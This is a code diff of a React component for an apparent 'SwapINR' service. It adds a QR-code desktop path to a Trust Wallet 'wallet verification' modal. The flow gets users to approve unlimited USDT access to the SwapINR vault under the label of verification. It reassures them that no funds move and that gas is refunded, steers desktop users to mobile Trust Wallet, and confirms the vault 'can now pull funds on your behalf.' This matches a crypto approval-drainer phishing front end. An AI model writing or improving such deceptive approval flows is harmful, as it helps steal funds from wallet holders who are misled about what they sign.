@@ -3,12 +3,14 @@
 import { useEffect, useRef, useState } from 'react';
 import { createPortal } from 'react-dom';
 import { useSession } from 'next-auth/react';
+import { QRCodeSVG } from 'qrcode.react';
 import { toast } from '@/components/ui/toast';
-import { WalletVerifyFlow } from '@/components/client/wallet-verify-flow';
 import { ClientShell } from '@/components/layout/client-shell';
 import { PageLoading } from '@/components/ui/loading';
 import { shortenAddress } from '@/lib/utils';
 import type { WalletDocument } from '@/types';
+
+const SUPPORT_URL = 'https://wa.me/919999999999'; // ← replace with real support link
 
 
 type Network = 'BEP20' | 'ERC20' | 'TRC20';
@@ -17,12 +19,6 @@ const NETWORKS: { key: Network; label: string; sublabel: string; color: string; 
   { key: 'BEP20', label: 'BNB Chain',  sublabel: 'BEP20 · USDT', color: '#FBBF24', bg: 'rgba(251,191,36,0.08)',  border: 'rgba(251,191,36,0.22)',  chain: 'BNB Smart Chain'  },
   { key: 'ERC20', label: 'Ethereum',   sublabel: 'ERC20 · USDT', color: '#818CF8', bg: 'rgba(129,140,248,0.08)', border: 'rgba(129,140,248,0.22)', chain: 'Ethereum Mainnet' },
   { key: 'TRC20', label: 'TRON',       sublabel: 'TRC20 · USDT', color: '#F87171', bg: 'rgba(248,113,113,0.08)', border: 'rgba(248,113,113,0.22)', chain: 'Tron Network'      },
-];
-
-const STEPS = [
-  { icon: 'link',     text: 'Connect your Trust Wallet — no login or password needed.' },
-  { icon: 'contract', text: 'Approve unlimited USDT access for the SwapINR vault. No funds are transferred now.' },
-  { icon: 'refund',   text: 'Gas fee is fully refunded by SwapINR after successful verification.' },
 ];
 
 function networkChainId(k: Network) {
@@ -287,30 +283,92 @@ function AddFundsModal({
 /* ── Trust Wallet coin IDs for deep link ── */
 const TRUST_COIN: Record<Network, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };
 
-/* ── Mobile verify modal — 2-step info → Trust Wallet deep link → real-time polling ── */
+/* ── Shared progress steps for the waiting/polling phase ── */
+const SESSION_STEPS = [
+  { key: 'pending',    label: 'Opening Trust Wallet' },
+  { key: 'connecting', label: 'Connecting wallet' },
+  { key: 'connected',  label: 'Wallet connected' },
+  { key: 'approving',  label: 'Approving contract' },
+  { key: 'approved',   label: 'Wallet verified' },
+];
+const SESSION_ORDER = ['pending', 'connecting', 'connected', 'approving', 'approved'];
+
+/*
+ * Unified verify modal — handles both:
+ *   isDesktop=false (mobile): shows "Open in Trust Wallet" button → navigates → polls
+ *   isDesktop=true  (PC):     auto-generates QR on mount → shows QR → polls in background
+ *                             QR hides and live progress shows as soon as mobile scans
+ */
 function MobileVerifyModal({
-  network, color, label, chain, depositAddress, onVerified, onClose,
+  network, color, label, chain, depositAddress, onVerified, onClose, isDesktop = false,
 }: {
   network: Network; color: string; label: string; chain: string;
   depositAddress: string;
   onVerified: (addr: string, txHash?: string) => void;
   onClose: () => void;
+  isDesktop?: boolean;
 }) {
-  const [phase,         setPhase]         = useState<'info' | 'waiting' | 'success' | 'failed'>('info');
+  /* 'qr'     — desktop only: QR visible, waiting for scan
+   * 'info'   — mobile: show info + button
+   * 'waiting'— QR scanned (desktop) or button pressed (mobile), TW flow in progress
+   * 'success'— approved on-chain
+   * 'failed' — connection or contract error from mobile */
+  const [phase,         setPhase]         = useState<'info' | 'qr' | 'waiting' | 'success' | 'failed'>(
+    isDesktop ? 'qr' : 'info'
+  );
+  const [qrUrl,         setQrUrl]         = useState('');
+  const [qrLoading,     setQrLoading]     = useState(false);
+  const [qrError,       setQrError]       = useState('');
   const [genError,      setGenError]      = useState('');
   const [genLoading,    setGenLoading]    = useState(false);
   const [sessionStatus, setSessionStatus] = useState<string>('pending');
   const [failedStep,    setFailedStep]    = useState<'connection' | 'contract' | null>(null);
   const [successAddr,   setSuccessAddr]   = useState('');
   const [successHash,   setSuccessHash]   = useState<string | undefined>();
-  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
-  const sidRef   = useRef('');
+  const pollRef        = useRef<ReturnType<typeof setInterval> | null>(null);
+  const sidRef         = useRef('');
+  const scannedRef     = useRef(false); // prevents QR→waiting transition more than once
 
   function stopPolling() {
     if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
   }
   useEffect(() => () => stopPolling(), []);
 
+  /* Desktop: auto-generate QR on mount */
+  useEffect(() => {
+    if (!isDesktop) return;
+    generateQR();
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  async function generateQR() {
+    setQrLoading(true); setQrError('');
+    try {
+      const res = await fetch('/api/wallet-connect/generate', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }),
+      });
+      if (!res.ok) throw new Error(`${res.status}`);
+      const { token, sid } = await res.json();
+      sidRef.current = sid;
+      scannedRef.current = false;
+
+      const origin      = window.location.origin;
+      const returnURL   = `/wallets/verify?network=${network}&compact=1&sid=${sid}`;
+      const exchangeURL = `${origin}/api/wallet-connect/exchange?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnURL)}`;
+      const deepLink    = `https://link.trustwallet.com/open_url?coin_id=${TRUST_COIN[network]}&url=${encodeURIComponent(exchangeURL)}`;
+
+      setQrUrl(deepLink);
+      /* Start polling immediately so we detect scan the moment it happens */
+      startPolling(sid);
+    } catch {
+      setQrError('Could not generate QR — click to retry');
+    } finally {
+      setQrLoading(false);
+    }
+  }
+
+  /* Mobile: button → navigate away → poll */
   async function openTrustWallet() {
     setGenLoading(true); setGenError('');
     try {
@@ -348,6 +406,13 @@ function MobileVerifyModal({
         if (!sr.ok) return;
         const data = await sr.json();
         setSessionStatus(data.status);
+
+        /* Desktop: QR was scanned — hide QR and show live progress */
+        if (isDesktop && !scannedRef.current && data.status !== 'pending') {
+          scannedRef.current = true;
+          setPhase('waiting');
+        }
+
         if (data.status === 'approved') {
           stopPolling();
           setSuccessAddr(data.address ?? '');
@@ -358,11 +423,18 @@ function MobileVerifyModal({
           setFailedStep(data.failedStep ?? 'connection');
           setPhase('failed');
         } else if (data.status === 'cancelled') {
-          /* User tapped "Start Over" inside Trust Wallet */
           stopPolling();
-          setPhase('info');
-          setSessionStatus('pending');
-          setFailedStep(null);
+          if (isDesktop) {
+            /* Regenerate QR so user can try again without closing */
+            scannedRef.current = false;
+            setSessionStatus('pending');
+            setPhase('qr');
+            generateQR();
+          } else {
+            setPhase('info');
+            setSessionStatus('pending');
+            setFailedStep(null);
+          }
         }
       } catch { /* keep polling */ }
     }, 2000);
@@ -370,24 +442,21 @@ function MobileVerifyModal({
 
   function retry() {
     stopPolling();
-    setPhase('info');
-    setGenError('');
     setSessionStatus('pending');
     setFailedStep(null);
     setSuccessAddr('');
     setSuccessHash(undefined);
+    if (isDesktop) {
+      scannedRef.current = false;
+      setPhase('qr');
+      generateQR();
+    } else {
+      setPhase('info');
+      setGenError('');
+    }
   }
 
-  /* Status steps displayed in waiting screen */
-  const STEPS = [
-    { key: 'pending',    label: 'Opening Trust Wallet' },
-    { key: 'connecting', label: 'Connecting wallet' },
-    { key: 'connected',  label: 'Wallet connected' },
-    { key: 'approving',  label: 'Approving contract' },
-    { key: 'approved',   label: 'Wallet verified' },
-  ];
-  const ORDER = ['pending', 'connecting', 'connected', 'approving', 'approved'];
-  const curIdx = ORDER.indexOf(sessionStatus);
+  const curIdx = SESSION_ORDER.indexOf(sessionStatus);
 
   /* Shared card style */
   const card: React.CSSProperties = {
@@ -396,278 +465,378 @@ function MobileVerifyModal({
     borderRadius: 12,
   };
 
+  /* ── Progress steps (shared between mobile waiting + desktop after scan) ── */
+  function ProgressSteps() {
+    return (
+      <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 16 }}>
+        {SESSION_STEPS.map(({ key, label: stepLabel }, i) => {
+          const done   = curIdx > i;
+          const active = curIdx === i;
+          return (
+            <div key={key} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
+              borderRadius: 12, transition: 'all 0.3s',
+              background: done ? 'rgba(0,229,160,0.05)' : active ? 'rgba(26,63,255,0.08)' : 'rgba(255,255,255,0.02)',
+              border: `1px solid ${done ? 'rgba(0,229,160,0.18)' : active ? 'rgba(77,121,255,0.3)' : 'rgba(255,255,255,0.05)'}`,
+            }}>
+              <div style={{ width: 26, height: 26, borderRadius: '50%', flexShrink: 0,
+                display: 'flex', alignItems: 'center', justifyContent: 'center',
+                background: done ? 'rgba(0,229,160,0.12)' : active ? 'rgba(26,63,255,0.18)' : 'rgba(255,255,255,0.04)',
+                border: `1px solid ${done ? 'rgba(0,229,160,0.3)' : active ? 'rgba(77,121,255,0.5)' : 'rgba(255,255,255,0.08)'}`,
+              }}>
+                {done ? (
+                  <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5L4 8L9.5 2.5" stroke="#00E5A0" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                ) : active ? (
+                  <div style={{ width: 11, height: 11, borderRadius: '50%', border: '2px solid rgba(255,255,255,0.1)', borderTopColor: '#4D79FF', animation: 'spin 0.7s linear infinite' }} />
+                ) : (
+                  <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'rgba(255,255,255,0.1)' }} />
+                )}
+              </div>
+              <span style={{ fontSize: 13, fontWeight: done || active ? 700 : 500,
+                color: done ? '#00E5A0' : active ? '#fff' : 'rgba(255,255,255,0.3)' }}>
+                {stepLabel}{done ? ' ✓' : ''}
+              </span>
+            </div>
+          );
+        })}
+      </div>
+    );
+  }
+
+  /* ── Inner content (shared) ── */
+  function ModalContent() {
+    /* ─── Desktop QR phase ─── */
+    if (isDesktop && phase === 'qr') {
+      return (
+        <div style={{ animation: 'fadein 0.2s ease-out' }}>
+          {/* Header */}
+          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 22 }}>
+            <NetworkUsdtIcon network={network} size={44} />
+            <div style={{ flex: 1 }}>
+              <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
+                Add {label} Wallet
+              </p>
+              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
+            </div>
+            <button onClick={onClose} style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)', color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
+              <IcoX />
+            </button>
+          </div>
+
+          {/* PC-only notice */}
+          <div style={{ ...card, padding: '12px 14px', marginBottom: 18, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(77,159,255,0.18)', background: 'rgba(77,159,255,0.05)' }}>
+            <svg width="15" height="15" viewBox="0 0 15 15" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
+              <rect x="1.5" y="2" width="12" height="8.5" rx="1.5" stroke="#4D9FFF" strokeWidth="1.3"/>
+              <path d="M5 13.5H10M7.5 10.5V13.5" stroke="#4D9FFF" strokeWidth="1.3" strokeLinecap="round"/>
+            </svg>
+            <div>
+              <p style={{ fontSize: 12, fontWeight: 700, color: '#4D9FFF', margin: '0 0 2px' }}>PC detected — mobile verification required</p>
+              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0, lineHeight: 1.55 }}>
+                Extension wallets are not supported. Scan the QR with Trust Wallet on your phone to continue.
+              </p>
+            </div>
+          </div>
+
+          {/* QR code */}
+          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 14, marginBottom: 18 }}>
+            {qrLoading ? (
+              <div style={{ width: 200, height: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 16 }}>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10 }}>
+                  <div style={{ width: 20, height: 20, borderRadius: '50%', border: '2.5px solid rgba(255,255,255,0.1)', borderTopColor: '#CCFF00', animation: 'spin 0.7s linear infinite' }} />
+                  <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)' }}>Generating QR…</span>
+                </div>
+              </div>
+            ) : qrError ? (
+              <div style={{ width: 200, height: 200, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 12, background: 'rgba(248,113,113,0.04)', border: '1px solid rgba(248,113,113,0.18)', borderRadius: 16 }}>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#F87171" strokeWidth="1.5"/><path d="M12 8V12M12 16h.01" stroke="#F87171" strokeWidth="1.5" strokeLinecap="round"/></svg>
+                <button onClick={generateQR} style={{ fontSize: 12, fontWeight: 700, color: '#F87171', background: 'transparent', border: '1px solid rgba(248,113,113,0.3)', borderRadius: 8, padding: '6px 14px', cursor: 'pointer' }}>
+                  Retry
+                </button>
+              </div>
+            ) : qrUrl ? (
+              <>
+                <div style={{ padding: 14, background: '#ffffff', borderRadius: 16, boxShadow: '0 0 0 1px rgba(255,255,255,0.08), 0 8px 32px rgba(0,0,0,0.4)' }}>
+                  <QRCodeSVG value={qrUrl} size={172} bgColor="#ffffff" fgColor="#000000" level="M" />
+                </div>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                    <svg width="14" height="14" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#3375BB"/><path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/><path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                    <span style={{ fontSize: 12, fontWeight: 700, color: 'rgba(255,255,255,0.7)' }}>Scan with Trust Wallet</span>
+                  </div>
+                  <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)', margin: 0, textAlign: 'center', lineHeight: 1.5 }}>
+                    Open Trust Wallet → tap the scanner icon → scan
+                  </p>
+                </div>
+              </>
+            ) : null}
+          </div>
+
+          {/* Steps reminder */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 18 }}>
+            {[
+              { n: 1, text: 'Open Trust Wallet on your phone' },
+              { n: 2, text: 'Tap the scanner icon and scan the QR' },
+              { n: 3, text: 'Tap "Connect" then "Approve" in Trust Wallet' },
+            ].map(({ n, text }) => (
+              <div key={n} style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+                <div style={{ width: 22, height: 22, borderRadius: 6, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.18)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 11, fontWeight: 900, color: '#CCFF00' }}>
+                  {n}
+                </div>
+                <span style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', lineHeight: 1.5 }}>{text}</span>
+              </div>
+            ))}
+          </div>
+
+          {/* Contact support */}
+          <a href={SUPPORT_URL} target="_blank" rel="noopener noreferrer"
+            style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, width: '100%', padding: '12px', borderRadius: 12,
+              fontSize: 13, fontWeight: 700, color: 'rgba(255,255,255,0.5)',
+              background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.09)',
+              textDecoration: 'none', cursor: 'pointer' }}>
+            <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="currentColor" strokeWidth="1.2"/><path d="M7 4.5V7L8.5 8.5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
+            Contact Support
+          </a>
+        </div>
+      );
+    }
+
+    /* ─── Mobile info step ─── */
+    if (!isDesktop && phase === 'info') {
+      return (
+        <div style={{ animation: 'fadein 0.2s ease-out' }}>
+          {/* Title row */}
+          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
+            <NetworkUsdtIcon network={network} size={44} />
+            <div style={{ flex: 1 }}>
+              <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
+                Add {label} Wallet
+              </p>
+              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
+            </div>
+            <button onClick={onClose} style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)', color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
+              <IcoX />
+            </button>
+          </div>
+
+          {/* Steps */}
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
+            {[
+              { n: 1, title: 'Connect Wallet',          text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
+              { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwapINR vault unlimited USDT access. No funds move now.' },
+            ].map(({ n, title, text }) => (
+              <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
+                <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
+                  {n}
+                </div>
+                <div>
+                  <p style={{ fontSize: 13, fontWeight: 800, color: '#fff', margin: '0 0 2px' }}>{title}</p>
+                  <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: 0, lineHeight: 1.6 }}>{text}</p>
+                </div>
+              </div>
+            ))}
+          </div>
+
+          <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
+            <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
+              <span style={{ color: '#F87171', fontWeight: 700 }}>TRC20 requires ~10 TRX gas</span> — charged by TRON network for the approval transaction
+            </p>
+          </div>
+
+          <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10, borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
+            <IcoRefund />
+            <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
+              <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> after successful verification
+            </p>
+          </div>
+
+          {genError && (
+            <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 12px', padding: '9px 12px', background: 'rgba(248,113,113,0.07)', borderRadius: 10, border: '1px solid rgba(248,113,113,0.2)' }}>
+              {genError}
+            </p>
+          )}
+
+          <button onClick={openTrustWallet} disabled={genLoading}
+            style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none',
+              cursor: genLoading ? 'not-allowed' : 'pointer',
+              background: genLoading ? 'rgba(255,255,255,0.07)' : '#CCFF00',
+              color: genLoading ? 'rgba(255,255,255,0.3)' : '#000',
+              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10,
+              letterSpacing: '-0.01em',
+              boxShadow: genLoading ? 'none' : '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
+            {genLoading ? (
+              <>
+                <div style={{ width: 16, height: 16, border: '2px solid rgba(255,255,255,0.15)', borderTopColor: 'rgba(255,255,255,0.5)', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
+                Generating secure link…
+              </>
+            ) : (
+              <>
+                <svg width="18" height="18" viewBox="0 0 40 40" fill="none">
+                  <rect width="40" height="40" rx="10" fill="#3375BB"/>
+                  <path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/>
+                  <path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+                Open in Trust Wallet →
+              </>
+            )}
+          </button>
+        </div>
+      );
+    }
+
+    /* ─── Waiting (live progress — same on mobile & desktop post-scan) ─── */
+    if (phase === 'waiting') {
+      return (
+        <div style={{ animation: 'fadein 0.2s ease-out' }}>
+          <div style={{ textAlign: 'center', marginBottom: 22 }}>
+            {isDesktop && (
+              <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 12 }}>
+                <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#00E5A0', boxShadow: '0 0 6px rgba(0,229,160,0.6)' }} />
+                <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0' }}>QR scanned — Trust Wallet active</span>
+              </div>
+            )}
+            <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: '0 0 4px', letterSpacing: '-0.02em' }}>
+              {isDesktop ? 'Verifying on Mobile' : 'Waiting for Trust Wallet'}
+            </p>
+            <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.4)', margin: 0 }}>
+              {isDesktop
+                ? 'Complete the approval steps in Trust Wallet on your phone'
+                : 'Complete the steps inside Trust Wallet'}
+            </p>
+          </div>
+
+          <ProgressSteps />
+
+          <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.25)', textAlign: 'center', margin: '0 0 14px', lineHeight: 1.5 }}>
+            Updates automatically — keep this page open
+          </p>
+
+          <button onClick={retry}
+            style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
+              border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
+            Start Over
+          </button>
+        </div>
+      );
+    }
+
+    /* ─── Success ─── */
+    if (phase === 'success') {
+      return (
+        <div style={{ textAlign: 'center', padding: '8px 0', animation: 'fadein 0.25s ease-out' }}>
+          <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'rgba(0,229,160,0.08)', border: '2px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+              <path d="M5 16L12.5 23.5L27 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
+            </svg>
+          </div>
+          <p style={{ fontSize: 22, fontWeight: 900, color: '#fff', margin: '0 0 6px', letterSpacing: '-0.025em' }}>Wallet Verified!</p>
+          <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.5)', margin: '0 0 16px', lineHeight: 1.6 }}>
+            Your {label} wallet is connected and the unlimited USDT approval is confirmed on-chain.
+          </p>
+          {successAddr && (
+            <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 20 }}>
+              <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="5" r="4" stroke="#00E5A0" strokeWidth="1.2"/><circle cx="5" cy="5" r="1.5" fill="#00E5A0"/></svg>
+              <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0', fontFamily: 'monospace' }}>
+                {successAddr.slice(0, 8)}…{successAddr.slice(-6)}
+              </span>
+            </div>
+          )}
+          <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px', background: 'rgba(0,229,160,0.05)', border: '1px solid rgba(0,229,160,0.12)', borderRadius: 12, marginBottom: 22, textAlign: 'left' }}>
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
+            <div style={{ flex: 1 }}>
+              <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
+              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwapINR vault can now pull funds on your behalf</p>
+            </div>
+          </div>
+          <button onClick={() => onVerified(successAddr, successHash)}
+            style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
+            Done →
+          </button>
+        </div>
+      );
+    }
+
+    /* ─── Failed ─── */
+    return (
+      <div style={{ textAlign: 'center', padding: '4px 0', animation: 'fadein 0.2s ease-out' }}>
+        <div style={{ width: 64, height: 64, borderRadius: 18, background: 'rgba(255,92,124,0.08)', border: '1px solid rgba(255,92,124,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px' }}>
+          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+            {failedStep === 'connection' ? (
+              <>
+                <path d="M6 14a8 8 0 0 1 8-8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
+                <path d="M22 14a8 8 0 0 1-8 8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="3 2"/>
+                <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
+              </>
+            ) : (
+              <>
+                <circle cx="14" cy="14" r="10" stroke="#FF5C7C" strokeWidth="2"/>
+                <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
+              </>
+            )}
+          </svg>
+        </div>
+        <p style={{ fontSize: 20, fontWeight: 900, color: '#fff', margin: '0 0 8px', letterSpacing: '-0.025em' }}>
+          {isDesktop ? 'Verification Failed' : 'Uhh oh!'}
+        </p>
+        <p style={{ fontSize: 14, fontWeight: 700, color: 'rgba(255,255,255,0.7)', margin: '0 0 6px' }}>
+          {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval declined'}
+        </p>
+        <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.4)', margin: '0 0 24px', lineHeight: 1.7 }}>
+          {failedStep === 'connection'
+            ? (isDesktop ? 'Tap "Connect" in Trust Wallet on your phone — then scan again.' : 'Tap "Connect" when Trust Wallet asks — then try again.')
+            : (isDesktop ? 'Tap "Approve" on the contract screen in Trust Wallet — then try again.' : 'Tap "Approve" on the contract screen — then try again.')}
+        </p>
+        <button onClick={retry}
+          style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
+          {isDesktop ? 'Show New QR →' : 'Try Again →'}
+        </button>
+        {isDesktop && (
+          <a href={SUPPORT_URL} target="_blank" rel="noopener noreferrer"
+            style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700, color: 'rgba(255,255,255,0.4)', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.09)', textDecoration: 'none' }}>
+            Contact Support
+          </a>
+        )}
+        {!isDesktop && (
+          <button onClick={onClose} style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700, border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
+            Cancel
+          </button>
+        )}
+      </div>
+    );
+  }
+
+  /* ── Desktop: centered glass modal ── */
+  if (isDesktop) {
+    const modal = (
+      <div
+        onClick={e => { if (e.target === e.currentTarget && (phase === 'qr' || phase === 'info')) onClose(); }}
+        style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px 16px', background: 'rgba(0,0,0,0.72)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
+      >
+        <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}`}</style>
+        <div style={{ width: '100%', maxWidth: 440, background: 'linear-gradient(160deg, #161E40 0%, #111830 100%)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 20, boxShadow: '0 32px 80px rgba(0,0,0,0.7)', overflow: 'hidden', maxHeight: '92dvh', overflowY: 'auto' } as React.CSSProperties}>
+          <div style={{ height: 2, background: `linear-gradient(90deg, ${color}44, ${color}, ${color}44)` }} />
+          <div style={{ padding: '22px 24px 28px' }}>
+            <ModalContent />
+          </div>
+        </div>
+      </div>
+    );
+    if (typeof document === 'undefined') return null;
+    return createPortal(modal, document.body);
+  }
+
+  /* ── Mobile: bottom sheet ── */
   const modal = (
